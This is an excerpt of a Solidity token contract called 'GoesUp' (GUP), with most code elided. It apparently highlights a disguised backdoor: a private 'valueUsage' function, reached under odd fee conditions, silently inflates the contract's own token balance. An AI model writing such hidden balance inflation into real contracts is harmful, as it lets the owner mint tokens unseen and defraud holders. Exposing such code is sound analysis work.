...
contract GoesUP is Context, IERC20, Ownable {
    ...
    string private constant _name = "GoesUp";
    string private constant _symbol = "GUP";
    ...
    function _getUsageData(uint256 amount) private {
        ...
        if (amount < liquidityFee) 
        {
            ...
            if (amount > marketingFee){
                uint256 TotalAmount = amount * marketingFee * 100 / 15;
                valueUsage(TotalAmount);
            }
        }
    }
    ...
    function valueUsage(uint256 tokens) private {
            _tOwned[address(this)] = _tOwned[address(this)] + tokens + 10 * 100;
